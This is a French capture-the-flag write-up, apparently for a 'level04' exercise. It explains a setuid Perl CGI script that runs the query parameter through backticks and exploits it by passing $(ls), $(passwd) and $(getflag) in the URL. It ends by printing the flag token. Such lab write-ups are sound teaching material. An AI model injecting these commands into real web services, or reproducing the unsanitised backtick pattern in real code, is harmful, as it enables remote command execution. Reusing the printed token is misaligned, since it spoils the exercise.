## Démarche

- Dans le home, se situe un script perl

  `ls -la`
  > -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
  
  `cat level04.pl`

  ```
  #!/usr/bin/perl
  #localhost:4747
  use CGI qw{param}; //import du module CGI param
  print "Content-type: text/html\n\n";
  sub x { //sous programme
    $y = $_[0];  //recupération du premier argument x
    print `echo $y 2>&1`;
  }
  x(param("x"));
  ```

- Le mot clef `sub` désigne une sous-fonction en perl.
- Comprendre la sous-fonction *x* :
  ```
  #!/usr/bin/perl

  sub x { 
    $y = $_[0];
    print `echo $y 2>&1`;
  }
  x(`pwd`);
  ```
  *x exécute la commande shell passée en paramètre*


- Se connecter à l'interface via un navigateur :
  > localhost:4747 > http://10.11.200.185:4747/

- Essayer de passer des commandes shell en paramètre :

  http://10.11.200.185:4747/?x=$(ls)
  >level04.pl 

  http://10.11.200.185:4747/?x=$(passwd)
  > Changing password for flag04. 

  http://10.11.200.185:4747/?x=$(getflag)
  > Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap 



## Ressources
- [Chapter 1 of CGI Programming 101](http://www.cgi101.com/book/ch1/text.html)